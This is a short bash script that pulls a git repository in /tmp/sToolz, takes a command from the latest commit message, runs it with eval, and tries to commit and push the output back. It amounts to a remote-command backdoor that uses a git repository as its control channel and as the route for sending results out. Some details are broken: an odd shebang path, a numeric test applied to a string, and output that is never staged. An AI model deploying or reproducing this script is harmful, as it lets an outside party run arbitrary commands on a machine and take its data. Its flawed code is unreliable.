#!/sbin/bash

# repo update
cd /tmp/sToolz
git pull

# get command
CMD=$(git log -1 | awk 'NR==5 {print $1}')

# check NOP
if [ $CMD -eq 'NOP' ]
then
    # do nothing
    echo "NOP"
else
    # do something
    eval $CMD >> ./output.txt
    # commit and push
    git commit -m "NOP"
    git push
fi
